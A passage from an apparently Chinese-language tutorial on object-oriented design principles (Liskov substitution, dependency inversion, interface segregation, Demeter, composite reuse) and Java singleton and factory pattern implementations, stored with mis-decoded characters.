·å†™èµ·æ¥è™½ç„¶ç®€å•ï¼Œä½†æ˜¯æ•´ä¸ªç»§æ‰¿ä½“ç³»çš„å¯å¤ç”¨æ€§ä¼šæ¯”è¾ƒå·®ï¼Œç‰¹åˆ«æ˜¯è¿ç”¨å¤šæ€æ¯”è¾ƒé¢‘ç¹æ—¶ï¼Œç¨‹åºè¿è¡Œå‡ºé”™çš„æ¦‚ç‡ä¼šéå¸¸å¤§ã€‚\n\nã€ä¾‹ã€‘æ­£æ–¹å½¢ä¸æ˜¯é•¿æ–¹å½¢ã€‚\n\nåœ¨æ•°å­¦é¢†åŸŸé‡Œï¼Œæ­£æ–¹å½¢æ¯«æ— ç–‘é—®æ˜¯é•¿æ–¹å½¢ï¼Œå®ƒæ˜¯ä¸€ä¸ªé•¿å®½ç›¸ç­‰çš„é•¿æ–¹å½¢ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¼€å‘çš„ä¸€ä¸ªä¸å‡ ä½•å›¾å½¢ç›¸å…³çš„è½¯ä»¶ç³»ç»Ÿï¼Œå°±å¯ä»¥é¡ºç†æˆç« çš„è®©æ­£æ–¹å½¢ç»§æ‰¿è‡ªé•¿æ–¹å½¢ã€‚\n\n![](https://img.jwt1399.top/img/202211082347129.png)\n\né•¿æ–¹å½¢ç±» Rectangleï¼Œæ­£æ–¹å½¢ç±» Squareï¼Œresizeæ–¹æ³•æ˜¯RectandleDemoç±»ä¸­çš„æ–¹æ³•ï¼Œç”¨æ¥å®ç°å®½åº¦é€æ¸å¢é•¿çš„æ•ˆæœã€‚\n\n- å‡å¦‚æˆ‘ä»¬æŠŠä¸€ä¸ªæ™®é€šé•¿æ–¹å½¢ä½œä¸ºå‚æ•°ä¼ å…¥resizeæ–¹æ³•ï¼Œå°±ä¼šçœ‹åˆ°é•¿æ–¹å½¢å®½åº¦é€æ¸å¢é•¿çš„æ•ˆæœï¼Œå½“å®½åº¦å¤§äºé•¿åº¦ï¼Œä»£ç å°±ä¼šåœæ­¢ï¼Œè¿™ç§è¡Œä¸ºçš„ç»“æœç¬¦åˆæˆ‘ä»¬çš„é¢„æœŸï¼›\n\n- å‡å¦‚æˆ‘ä»¬å†æŠŠä¸€ä¸ªæ­£æ–¹å½¢ä½œä¸ºå‚æ•°ä¼ å…¥resizeæ–¹æ³•åï¼Œå°±ä¼šçœ‹åˆ°æ­£æ–¹å½¢çš„å®½åº¦å’Œé•¿åº¦éƒ½åœ¨ä¸æ–­å¢é•¿ï¼Œä»£ç ä¼šä¸€ç›´è¿è¡Œä¸‹å»ï¼Œç›´è‡³ç³»ç»Ÿäº§ç”Ÿæº¢å‡ºé”™è¯¯ã€‚\n- æ‰€ä»¥ï¼Œæ™®é€šçš„é•¿æ–¹å½¢æ˜¯é€‚åˆçš„ï¼Œæ­£æ–¹å½¢ä¸é€‚åˆã€‚æˆ‘ä»¬å¾—å‡ºç»“è®ºï¼šåœ¨resizeæ–¹æ³•ä¸­ï¼ŒRectangleç±»å‹çš„å‚æ•°æ˜¯ä¸èƒ½è¢«Squareç±»å‹çš„å‚æ•°æ‰€ä»£æ›¿ï¼Œå¦‚æœè¿›è¡Œäº†æ›¿æ¢å°±å¾—ä¸åˆ°é¢„æœŸç»“æœã€‚å› æ­¤ï¼ŒSquareç±»å’ŒRectangleç±»ä¹‹é—´çš„ç»§æ‰¿å…³ç³»è¿åäº†é‡Œæ°ä»£æ¢åŸåˆ™ï¼Œå®ƒä»¬ä¹‹é—´çš„ç»§æ‰¿å…³ç³»ä¸æˆç«‹ï¼Œæ­£æ–¹å½¢ä¸æ˜¯é•¿æ–¹å½¢ã€‚\n\nå¦‚ä½•æ”¹è¿›å‘¢ï¼Ÿæ­¤æ—¶æˆ‘ä»¬éœ€è¦é‡æ–°è®¾è®¡ä»–ä»¬ä¹‹é—´çš„å…³ç³»ã€‚æŠ½è±¡å‡ºæ¥ä¸€ä¸ªå››è¾¹å½¢æ¥å£(Quadrilateral)ï¼Œè®©Rectangleç±»å’ŒSquareç±»å®ç°Quadrilateralæ¥å£\n\n![](https://img.jwt1399.top/img/202211091603915.png)\n\n### 3.ä¾èµ–å€’è½¬åŸåˆ™ï¼ˆDIPï¼‰\n\né«˜å±‚æ¨¡å—ä¸åº”è¯¥ä¾èµ–ä½å±‚æ¨¡å—ï¼Œä¸¤è€…éƒ½åº”è¯¥ä¾èµ–å…¶æŠ½è±¡ï¼›æŠ½è±¡ä¸åº”è¯¥ä¾èµ–ç»†èŠ‚ï¼Œç»†èŠ‚åº”è¯¥ä¾èµ–æŠ½è±¡ã€‚ç®€å•çš„è¯´å°±æ˜¯è¦æ±‚å¯¹æŠ½è±¡è¿›è¡Œç¼–ç¨‹ï¼Œä¸è¦å¯¹å®ç°è¿›è¡Œç¼–ç¨‹ï¼Œè¿™æ ·å°±é™ä½äº†å®¢æˆ·ä¸å®ç°æ¨¡å—é—´çš„è€¦åˆã€‚\n\nã€ä¾‹ã€‘ç»„è£…ç”µè„‘\n\nç°è¦ç»„è£…ä¸€å°ç”µè„‘ï¼Œéœ€è¦é…ä»¶cpuï¼Œç¡¬ç›˜ï¼Œå†…å­˜æ¡ã€‚åªæœ‰è¿™äº›é…ç½®éƒ½æœ‰äº†ï¼Œè®¡ç®—æœºæ‰èƒ½æ­£å¸¸çš„è¿è¡Œã€‚é€‰æ‹©cpuæœ‰å¾ˆå¤šé€‰æ‹©ï¼Œå¦‚Intelï¼ŒAMDç­‰ï¼Œç¡¬ç›˜å¯ä»¥é€‰æ‹©å¸Œæ·ï¼Œè¥¿æ•°ç­‰ï¼Œå†…å­˜æ¡å¯ä»¥é€‰æ‹©é‡‘å£«é¡¿ï¼Œæµ·ç›—èˆ¹ç­‰ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202211092111320.png\" style=\"zoom:67%;\" />\n\nå¯ä»¥çœ‹åˆ°å·²ç»ç»„è£…äº†ä¸€å°ç”µè„‘ï¼Œä½†æ˜¯ä¼¼ä¹ç»„è£…çš„ç”µè„‘çš„cpuåªèƒ½æ˜¯Intelçš„ï¼Œå†…å­˜æ¡åªèƒ½æ˜¯é‡‘å£«é¡¿çš„ï¼Œç¡¬ç›˜åªèƒ½æ˜¯å¸Œæ·çš„ï¼Œè¿™å¯¹ç”¨æˆ·è‚¯å®šæ˜¯ä¸å‹å¥½çš„ï¼Œç”¨æˆ·æœ‰äº†æœºç®±è‚¯å®šæ˜¯æƒ³æŒ‰ç…§è‡ªå·±çš„å–œå¥½ï¼Œé€‰æ‹©è‡ªå·±å–œæ¬¢çš„é…ä»¶ã€‚\n\næ ¹æ®ä¾èµ–å€’è½¬åŸåˆ™è¿›è¡Œæ”¹è¿›ï¼šæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹Computerç±»ï¼Œè®©Computerç±»ä¾èµ–æŠ½è±¡ï¼ˆå„ä¸ªé…ä»¶çš„æ¥å£ï¼‰ï¼Œè€Œä¸æ˜¯ä¾èµ–äºå„ä¸ªç»„ä»¶å…·ä½“çš„å®ç°ç±»ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202211092111536.png\" style=\"zoom:67%;\" />\n\n### 4.æ¥å£éš”ç¦»åŸåˆ™ï¼ˆISPï¼‰\n\nå®¢æˆ·ç«¯ä¸åº”è¯¥è¢«è¿«ä¾èµ–äºå®ƒä¸ä½¿ç”¨çš„æ–¹æ³•ï¼›ä¸€ä¸ªç±»å¯¹å¦ä¸€ä¸ªç±»çš„ä¾èµ–åº”è¯¥å»ºç«‹åœ¨æœ€å°çš„æ¥å£ä¸Šã€‚\n\nã€ä¾‹ã€‘å®‰å…¨é—¨æ¡ˆä¾‹\n\næˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªé»‘é©¬å“ç‰Œçš„å®‰å…¨é—¨ï¼Œè¯¥å®‰å…¨é—¨å…·æœ‰é˜²ç«ã€é˜²æ°´ã€é˜²ç›—çš„åŠŸèƒ½ã€‚å¯ä»¥å°†é˜²ç«ï¼Œé˜²æ°´ï¼Œé˜²ç›—åŠŸèƒ½æå–æˆä¸€ä¸ªæ¥å£ï¼Œå½¢æˆä¸€å¥—è§„èŒƒã€‚ç±»å›¾å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202211092115850.png)\n\nä¸Šé¢çš„è®¾è®¡æˆ‘ä»¬å‘ç°äº†å®ƒå­˜åœ¨çš„é—®é¢˜ï¼Œé»‘é©¬å“ç‰Œçš„å®‰å…¨é—¨å…·æœ‰é˜²ç›—ï¼Œé˜²æ°´ï¼Œé˜²ç«çš„åŠŸèƒ½ã€‚ç°åœ¨å¦‚æœæˆ‘ä»¬è¿˜éœ€è¦å†åˆ›å»ºä¸€ä¸ªä¼ æ™ºå“ç‰Œçš„å®‰å…¨é—¨ï¼Œè€Œè¯¥å®‰å…¨é—¨åªå…·æœ‰é˜²ç›—ã€é˜²æ°´åŠŸèƒ½å‘¢ï¼Ÿå¾ˆæ˜¾ç„¶å¦‚æœå®ç°SafetyDooræ¥å£å°±è¿èƒŒäº†æ¥å£éš”ç¦»åŸåˆ™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è¿›è¡Œä¿®æ”¹å‘¢ï¼Ÿ\n\n![](https://img.jwt1399.top/img/202211092115885.png)\n\n### 5.è¿ªç±³ç‰¹æ³•åˆ™ï¼ˆLODï¼‰\n\nè¿ªç±³ç‰¹æ³•åˆ™åˆå«æœ€å°‘çŸ¥è¯†åŸåˆ™ã€‚åªå’Œä½ çš„ç›´æ¥æœ‹å‹äº¤è°ˆï¼Œä¸è·Ÿâ€œé™Œç”Ÿäººâ€è¯´è¯ã€‚\n\nå¦‚æœä¸¤ä¸ªè½¯ä»¶å®ä½“æ— é¡»ç›´æ¥é€šä¿¡ï¼Œé‚£ä¹ˆå°±ä¸åº”å½“å‘ç”Ÿç›´æ¥çš„ç›¸äº’è°ƒç”¨ï¼Œå¯ä»¥é€šè¿‡ç¬¬ä¸‰æ–¹è½¬å‘è¯¥è°ƒç”¨ã€‚å…¶ç›®çš„æ˜¯é™ä½ç±»ä¹‹é—´çš„è€¦åˆåº¦ï¼Œæé«˜æ¨¡å—çš„ç›¸å¯¹ç‹¬ç«‹æ€§ã€‚\n\nã€ä¾‹ã€‘æ˜æ˜Ÿä¸ç»çºªäººçš„å…³ç³»å®ä¾‹\n\næ˜æ˜Ÿç”±äºå…¨èº«å¿ƒæŠ•å…¥è‰ºæœ¯ï¼Œæ‰€ä»¥è®¸å¤šæ—¥å¸¸äº‹åŠ¡ç”±ç»çºªäººè´Ÿè´£å¤„ç†ï¼Œå¦‚å’Œç²‰ä¸çš„è§é¢ä¼šï¼Œå’Œåª’ä½“å…¬å¸çš„ä¸šåŠ¡æ´½æ·¡ç­‰ã€‚è¿™é‡Œçš„ç»çºªäººæ˜¯æ˜æ˜Ÿçš„æœ‹å‹ï¼Œè€Œç²‰ä¸å’Œåª’ä½“å…¬å¸æ˜¯é™Œç”Ÿäººï¼Œæ‰€ä»¥é€‚åˆä½¿ç”¨è¿ªç±³ç‰¹æ³•åˆ™ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202211092126268.png\" style=\"zoom:67%;\" />\n\n### 6.åˆæˆå¤ç”¨åŸåˆ™ï¼ˆCARPï¼‰\n\nåˆæˆå¤ç”¨åŸåˆ™æ˜¯æŒ‡ï¼šå°½é‡å…ˆä½¿ç”¨ç»„åˆæˆ–è€…èšåˆç­‰å…³è”å…³ç³»æ¥å®ç°ï¼Œå…¶æ¬¡æ‰è€ƒè™‘ä½¿ç”¨ç»§æ‰¿å…³ç³»æ¥å®ç°ã€‚\n\nã€ä¾‹ã€‘æ±½è½¦åˆ†ç±»ç®¡ç†ç¨‹åº\n\næ±½è½¦æŒ‰â€œåŠ¨åŠ›æºâ€åˆ’åˆ†å¯åˆ†ä¸ºæ±½æ²¹æ±½è½¦ã€ç”µåŠ¨æ±½è½¦ç­‰ï¼›æŒ‰â€œé¢œè‰²â€åˆ’åˆ†å¯åˆ†ä¸ºç™½è‰²æ±½è½¦ã€é»‘è‰²æ±½è½¦å’Œçº¢è‰²æ±½è½¦ç­‰ã€‚å¦‚æœåŒæ—¶è€ƒè™‘è¿™ä¸¤ç§åˆ†ç±»ï¼Œå…¶ç»„åˆå°±å¾ˆå¤šã€‚\n\n<img src=\"https://img.jwt1399.top/img/202211092125045.png\" style=\"zoom:67%;\" />\n\nä»ä¸Šé¢ç±»å›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä½¿ç”¨ç»§æ‰¿å¤ç”¨äº§ç”Ÿäº†å¾ˆå¤šå­ç±»ï¼Œå¦‚æœç°åœ¨åˆæœ‰æ–°çš„åŠ¨åŠ›æºæˆ–è€…æ–°çš„é¢œè‰²çš„è¯ï¼Œå°±éœ€è¦å†å®šä¹‰æ–°çš„ç±»ã€‚æˆ‘ä»¬è¯•ç€å°†ç»§æ‰¿å¤ç”¨æ”¹ä¸ºèšåˆå¤ç”¨çœ‹ä¸€ä¸‹ã€‚\n\n![](https://img.jwt1399.top/img/202211092125707.png)\n\n\n\n# â‘ åˆ›å»ºå‹æ¨¡å¼-5ç§\n\n> åˆ›å»ºå‹æ¨¡å¼çš„ä¸»è¦å…³æ³¨ç‚¹æ˜¯â€œæ€æ ·åˆ›å»ºå¯¹è±¡ï¼Ÿâ€ï¼Œå®ƒçš„ä¸»è¦ç‰¹ç‚¹æ˜¯â€œå°†å¯¹è±¡çš„åˆ›å»ºä¸ä½¿ç”¨åˆ†ç¦»â€ã€‚\n>\n> è¿™æ ·å¯ä»¥é™ä½ç³»ç»Ÿçš„è€¦åˆåº¦ï¼Œä½¿ç”¨è€…ä¸éœ€è¦å…³æ³¨å¯¹è±¡çš„åˆ›å»ºç»†èŠ‚ã€‚\n\n## â¶å•ä¾‹æ¨¡å¼\n\nå•ä¾‹æ¨¡å¼ï¼ˆSingleton Patternï¼‰æä¾›äº†ä¸€ç§åˆ›å»ºå¯¹è±¡çš„æœ€ä½³æ–¹å¼ã€‚è¿™ç§æ¨¡å¼æ¶‰åŠåˆ°ä¸€ä¸ªå•ä¸€çš„ç±»ï¼Œè¯¥ç±»è´Ÿè´£**åˆ›å»ºè‡ªå·±çš„å¯¹è±¡**ï¼ŒåŒæ—¶ç¡®ä¿åªæœ‰**å•ä¸ªå¯¹è±¡è¢«åˆ›å»º**ã€‚è¿™ä¸ªç±»**æä¾›äº†ä¸€ç§è®¿é—®å…¶å”¯ä¸€çš„å¯¹è±¡çš„æ–¹å¼**ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ï¼Œä¸éœ€è¦å®ä¾‹åŒ–è¯¥ç±»çš„å¯¹è±¡ã€‚\n\nå•ä¾‹è®¾è®¡æ¨¡å¼åˆ†ä¸ºä¸¤ç§ï¼š\n\n- é¥¿æ±‰å¼ï¼šç±»åŠ è½½å°±ä¼šå¯¼è‡´è¯¥å•å®ä¾‹å¯¹è±¡è¢«åˆ›å»º\t\n\n- æ‡’æ±‰å¼ï¼šç±»åŠ è½½ä¸ä¼šå¯¼è‡´è¯¥å•å®ä¾‹å¯¹è±¡è¢«åˆ›å»ºï¼Œè€Œæ˜¯é¦–æ¬¡ä½¿ç”¨è¯¥å¯¹è±¡æ—¶æ‰ä¼šåˆ›å»º\n\n### 1.é¥¿æ±‰å¼\n\n#### **æ–¹å¼1ï¼ˆé™æ€å˜é‡æ–¹å¼ï¼‰**\n\n```java\npublic class Singleton {\n    //ç§æœ‰æ„é€ æ–¹æ³•\n    private Singleton() {}\n\n    //åœ¨æˆå‘˜ä½ç½®åˆ›å»ºè¯¥ç±»çš„å¯¹è±¡\n    private static Singleton instance = new Singleton();\n\n    //å¯¹å¤–æä¾›é™æ€æ–¹æ³•è·å–è¯¥å¯¹è±¡\n    public static Singleton getInstance() {\n        return instance;\n    }\n}\n```\n\nè¯¥æ–¹å¼åœ¨æˆå‘˜ä½ç½®å£°æ˜Singletonç±»å‹çš„é™æ€å˜é‡ï¼Œå¹¶åˆ›å»ºSingletonç±»çš„å¯¹è±¡instanceã€‚instanceå¯¹è±¡æ˜¯éšç€ç±»çš„åŠ è½½è€Œåˆ›å»ºçš„ã€‚å¦‚æœè¯¥å¯¹è±¡è¶³å¤Ÿå¤§çš„è¯ï¼Œè€Œä¸€ç›´æ²¡æœ‰ä½¿ç”¨å°±ä¼šé€ æˆå†…å­˜çš„æµªè´¹ã€‚\n\n#### **æ–¹å¼2ï¼ˆé™æ€ä»£ç å—æ–¹å¼ï¼‰**\n\n```java\npublic class Singleton {\n    //ç§æœ‰æ„é€ æ–¹æ³•\n    private Singleton() {}\n\n    //åœ¨æˆå‘˜ä½ç½®åˆ›å»ºè¯¥ç±»çš„å¯¹è±¡\n    private static Singleton instance;\n    static {\n        instance = new Singleton();\n    }\n\n    //å¯¹å¤–æä¾›é™æ€æ–¹æ³•è·å–è¯¥å¯¹è±¡\n    public static Singleton getInstance() {\n        return instance;\n    }\n}\n```\n\nè¯¥æ–¹å¼åœ¨æˆå‘˜ä½ç½®å£°æ˜Singletonç±»å‹çš„é™æ€å˜é‡ï¼Œè€Œå¯¹è±¡çš„åˆ›å»ºæ˜¯åœ¨é™æ€ä»£ç å—ä¸­ï¼Œä¹Ÿæ˜¯å¯¹ç€ç±»çš„åŠ è½½è€Œåˆ›å»ºã€‚æ‰€ä»¥å’Œé¥¿æ±‰å¼çš„æ–¹å¼1åŸºæœ¬ä¸Šä¸€æ ·ï¼Œå½“ç„¶è¯¥æ–¹å¼ä¹Ÿå­˜åœ¨å†…å­˜æµªè´¹é—®é¢˜ã€‚\n\n#### æ–¹å¼3ï¼ˆæšä¸¾æ–¹å¼ï¼‰-æ¨è\n\n```java\npublic enum Singleton {\n    INSTANCE;\n}\n```\n\næšä¸¾ç±»å®ç°å•ä¾‹æ¨¡å¼æ˜¯æåŠ›æ¨èçš„å•ä¾‹å®ç°æ¨¡å¼ï¼Œå› ä¸ºæšä¸¾ç±»å‹æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå¹¶ä¸”åªä¼šè£…è½½ä¸€æ¬¡ï¼Œè®¾è®¡è€…å……åˆ†çš„åˆ©ç”¨äº†æšä¸¾çš„è¿™ä¸ªç‰¹æ€§æ¥å®ç°å•ä¾‹æ¨¡å¼ï¼Œæšä¸¾çš„å†™æ³•éå¸¸ç®€å•ï¼Œè€Œä¸”æšä¸¾ç±»å‹æ˜¯æ‰€ç”¨å•ä¾‹å®ç°ä¸­å”¯ä¸€ä¸€ç§ä¸ä¼šè¢«ç ´åçš„å•ä¾‹å®ç°æ¨¡å¼ã€‚\n\n### 2.æ‡’æ±‰å¼\n\n#### **æ–¹å¼1ï¼ˆçº¿ç¨‹ä¸å®‰å…¨ï¼‰**\n\n```java\npublic class Singleton {\n    //ç§æœ‰æ„é€ æ–¹æ³•\n    private Singleton() {}\n\n    //åœ¨æˆå‘˜ä½ç½®åˆ›å»ºè¯¥ç±»çš„å¯¹è±¡\n    private static Singleton instance;\n\n    //å¯¹å¤–æä¾›é™æ€æ–¹æ³•è·å–è¯¥å¯¹è±¡\n    public static Singleton getInstance() {\n        // ä¿è¯å§‹ç»ˆåªåˆ›å»ºä¸€ä¸ªå¯¹è±¡\n        if(instance == null) { //è¿™é‡Œä¼šå‡ºç°çº¿ç¨‹å®‰å…¨é—®é¢˜\n            instance = new Singleton();\n        }\n        return instance;\n    }\n}\n```\n\nè¯¥æ–¹å¼åœ¨æˆå‘˜ä½ç½®å£°æ˜Singletonç±»å‹çš„é™æ€å˜é‡ï¼Œå½“è°ƒç”¨getInstance()æ–¹æ³•è·å–Singletonç±»çš„å¯¹è±¡çš„æ—¶å€™æ‰åˆ›å»ºSingletonç±»çš„å¯¹è±¡ï¼Œè¿™æ ·å°±å®ç°äº†æ‡’åŠ è½½çš„æ•ˆæœã€‚ä½†æ˜¯ï¼Œå¦‚æœæ˜¯å¤šçº¿ç¨‹ç¯å¢ƒï¼Œä¼šå‡ºç°çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚\n\n#### **æ–¹å¼2ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰**\n\n```java\npublic class Singleton {\n    //ç§æœ‰æ„é€ æ–¹æ³•\n    private Singleton() {}\n\n    //åœ¨æˆå‘˜ä½ç½®åˆ›å»ºè¯¥ç±»çš„å¯¹è±¡\n    private static Singleton instance;\n\n    //å¯¹å¤–æä¾›é™æ€æ–¹æ³•è·å–è¯¥å¯¹è±¡\n    public static synchronized Singleton getInstance() {\n\n        if(instance == null) {\n            instance = new Singleton();\n        }\n        return instance;\n    }\n}\n```\n\nè¯¥æ–¹å¼ä¹Ÿå®ç°äº†æ‡’åŠ è½½æ•ˆæœï¼ŒåŒæ—¶åˆè§£å†³äº†çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚ä½†æ˜¯åœ¨getInstance()æ–¹æ³•ä¸Šæ·»åŠ äº†synchronizedå…³é”®å­—ï¼Œå¯¼è‡´è¯¥æ–¹æ³•çš„æ‰§è¡Œæ•ˆæœç‰¹åˆ«ä½ã€‚ä»ä¸Šé¢ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå…¶å®å°±æ˜¯åœ¨åˆå§‹åŒ–instanceçš„æ—¶å€™æ‰ä¼šå‡ºç°çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œä¸€æ—¦åˆå§‹åŒ–å®Œæˆå°±ä¸å­˜åœ¨äº†ã€‚\n\n#### æ–¹å¼3ï¼ˆåŒé‡æ£€æŸ¥é”ï¼‰-æ¨è\n\nå¯¹äº `getInstance()` æ–¹æ³•æ¥è¯´ï¼Œç»å¤§éƒ¨åˆ†çš„æ“ä½œéƒ½æ˜¯è¯»æ“ä½œï¼Œè¯»æ“ä½œæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡å¿…è®©æ¯ä¸ªçº¿ç¨‹å¿…é¡»æŒæœ‰é”æ‰èƒ½è°ƒç”¨è¯¥æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦è°ƒæ•´åŠ é”çš„æ—¶æœºã€‚ç”±æ­¤ä¹Ÿäº§ç”Ÿäº†ä¸€ç§æ–°çš„å®ç°æ¨¡å¼ï¼šåŒé‡æ£€æŸ¥é”æ¨¡å¼\n\n```java\npublic class Singleton { \n\n    //ç§æœ‰æ„é€ æ–¹æ³•\n    private Singleton() {}\n\n    private static Singleton instance;\n\n   //å¯¹å¤–æä¾›é™æ€æ–¹æ³•è·å–è¯¥å¯¹è±¡\n    public static Singleton getInstance() {\n\t\t//ç¬¬ä¸€æ¬¡åˆ¤æ–­ï¼Œå¦‚æœinstanceä¸ä¸ºnullï¼Œä¸è¿›å…¥æŠ¢é”é˜¶æ®µï¼Œç›´æ¥è¿”å›å®ä¾‹\n        if(instance == null) {\n            synchronized (Singleton.class) {\n                //æŠ¢åˆ°é”ä¹‹åå†æ¬¡åˆ¤æ–­æ˜¯å¦ä¸ºnull\n                if(instance == null) {\n                    instance = new Singleton();\n                }\n            }\n        }\n        return instance;\n    }\n}\n```\n\nåŒé‡æ£€æŸ¥é”æ¨¡å¼æ˜¯ä¸€ç§éå¸¸å¥½çš„å•ä¾‹å®ç°æ¨¡å¼ï¼Œè§£å†³äº†å•ä¾‹ã€æ€§èƒ½ã€çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œä¸Šé¢çš„åŒé‡æ£€æµ‹é”æ¨¡å¼çœ‹ä¸Šå»å®Œç¾æ— ç¼ºï¼Œå…¶å®æ˜¯å­˜åœ¨é—®é¢˜ï¼Œåœ¨å¤šçº¿ç¨‹çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šå‡ºç°ç©ºæŒ‡é’ˆé—®é¢˜ï¼Œå‡ºç°é—®é¢˜çš„åŸå› æ˜¯JVMåœ¨å®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™ä¼šè¿›è¡Œä¼˜åŒ–å’ŒæŒ‡ä»¤é‡æ’åºæ“ä½œã€‚\n\nè¦è§£å†³åŒé‡æ£€æŸ¥é”æ¨¡å¼å¸¦æ¥ç©ºæŒ‡é’ˆå¼‚å¸¸çš„é—®é¢˜ï¼Œåªéœ€è¦ä½¿ç”¨ `volatile` å…³é”®å­—, `volatile` å…³é”®å­—å¯ä»¥ä¿è¯å¯è§æ€§å’Œæœ‰åºæ€§ã€‚\n\n```java\npublic class Singleton {\n\n    //ç§æœ‰æ„é€ æ–¹æ³•\n    private Singleton() {}\n\n    private static volatile Singleton instance;\n\n   //å¯¹å¤–æä¾›é™æ€æ–¹æ³•è·å–è¯¥å¯¹è±¡\n    public static Singleton getInstance() {\n\t\t//ç¬¬ä¸€æ¬¡åˆ¤æ–­ï¼Œå¦‚æœinstanceä¸ä¸ºnullï¼Œä¸è¿›å…¥æŠ¢é”é˜¶æ®µï¼Œç›´æ¥è¿”å›å®é™…\n        if(instance == null) {\n            synchronized (Singleton.class) {\n                //æŠ¢åˆ°é”ä¹‹åå†æ¬¡åˆ¤æ–­æ˜¯å¦ä¸ºç©º\n                if(instance == null) {\n                    instance = new Singleton();\n                }\n            }\n        }\n        return instance;\n    }\n}\n```\n\næ·»åŠ  `volatile` å…³é”®å­—ä¹‹åçš„åŒé‡æ£€æŸ¥é”æ¨¡å¼æ˜¯ä¸€ç§æ¯”è¾ƒå¥½çš„å•ä¾‹å®ç°æ¨¡å¼ï¼Œèƒ½å¤Ÿä¿è¯åœ¨å¤šçº¿ç¨‹çš„æƒ…å†µä¸‹çº¿ç¨‹å®‰å…¨ä¹Ÿä¸ä¼šæœ‰æ€§èƒ½é—®é¢˜ã€‚\n\n#### æ–¹å¼4ï¼ˆé™æ€å†…éƒ¨ç±»ï¼‰-æ¨è\n\né™æ€å†…éƒ¨ç±»å•ä¾‹æ¨¡å¼ä¸­å®ä¾‹ç”±å†…éƒ¨ç±»åˆ›å»ºï¼Œç”±äº JVM åœ¨åŠ è½½å¤–éƒ¨ç±»çš„è¿‡ç¨‹ä¸­ï¼Œæ˜¯ä¸ä¼šåŠ è½½é™æ€å†…éƒ¨ç±»çš„ï¼Œ åªæœ‰å†…éƒ¨ç±»çš„å±æ€§/æ–¹æ³•è¢«è°ƒç”¨æ—¶æ‰ä¼šè¢«åŠ è½½, å¹¶åˆå§‹åŒ–å…¶é™æ€å±æ€§ã€‚é™æ€å±æ€§ç”±äºè¢« `static` ä¿®é¥°ï¼Œä¿è¯åªè¢«å®ä¾‹åŒ–ä¸€æ¬¡ï¼Œå¹¶ä¸”ä¸¥æ ¼ä¿è¯å®ä¾‹åŒ–é¡ºåºã€‚\n\n```java\npublic class Singleton {\n\n    //ç§æœ‰æ„é€ æ–¹æ³•\n    private Singleton() {}\n\n    private static class SingletonHolder {\n        private static final Singleton INSTANCE = new Singleton();\n    }\n\n    //å¯¹å¤–æä¾›é™æ€æ–¹æ³•è·å–è¯¥å¯¹è±¡\n    public static Singleton getInstance() {\n        return SingletonHolder.INSTANCE;\n    }\n}\n```\n\nç¬¬ä¸€æ¬¡åŠ è½½Singletonç±»æ—¶ä¸ä¼šå»åˆå§‹åŒ–INSTANCEï¼Œåªæœ‰ç¬¬ä¸€æ¬¡è°ƒç”¨getInstanceï¼Œè™šæ‹ŸæœºåŠ è½½SingletonHolderï¼Œå¹¶åˆå§‹åŒ–INSTANCEï¼Œè¿™æ ·ä¸ä»…èƒ½ç¡®ä¿çº¿ç¨‹å®‰å…¨ï¼Œä¹Ÿèƒ½ä¿è¯ Singleton ç±»çš„å”¯ä¸€æ€§ã€‚\n\né™æ€å†…éƒ¨ç±»å•ä¾‹æ¨¡å¼æ˜¯ä¸€ç§ä¼˜ç§€çš„å•ä¾‹æ¨¡å¼ï¼Œæ˜¯å¼€æºé¡¹ç›®ä¸­æ¯”è¾ƒå¸¸ç”¨çš„ä¸€ç§å•ä¾‹æ¨¡å¼ã€‚åœ¨æ²¡æœ‰åŠ ä»»ä½•é”çš„æƒ…å†µä¸‹ï¼Œä¿è¯äº†å¤šçº¿ç¨‹ä¸‹çš„å®‰å…¨ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•æ€§èƒ½å½±å“å’Œç©ºé—´çš„æµªè´¹ã€‚\n\n## â·å·¥å‚æ¨¡å¼\n\n> éœ€æ±‚ï¼šè®¾è®¡ä¸€ä¸ªå’–å•¡åº—ç‚¹é¤ç³»ç»Ÿã€‚  è®¾è®¡ä¸€ä¸ªå’–å•¡ç±»ï¼ˆCoffeeï¼‰ï¼Œå¹¶å®šä¹‰å…¶ä¸¤ä¸ªå­ç±»ï¼ˆç¾å¼å’–å•¡ã€AmericanCoffeeã€‘å’Œæ‹¿é“å’–å•¡ã€LatteCoffeeã€‘ï¼‰ï¼›å†è®¾è®¡ä¸€ä¸ªå’–å•¡åº—ç±»ï¼ˆCoffeeStoreï¼‰ï¼Œå’–å•¡åº—å…·æœ‰ç‚¹å’–å•¡çš„åŠŸèƒ½ã€‚\n\n![](https://img.jwt1399.top/img/202211101706221.png)\n\n```java\npublic class Client {\n    public static void main(String[] args) {\n        //1,åˆ›å»ºå’–å•¡åº—ç±»\n        CoffeeStore store = new CoffeeStore();\n        //2,ç‚¹å’–å•¡\n        Coffee coffee = store.orderCoffee(\"american\");\n\n        System.out.println(coffee.getName());\n    }\n}\n```\n\n### 1.ç®€å•å·¥å‚æ¨¡å¼\n\nç®€å•å·¥å‚åŒ…å«å¦‚ä¸‹è§’è‰²ï¼š\n\n* æŠ½è±¡äº§å“ 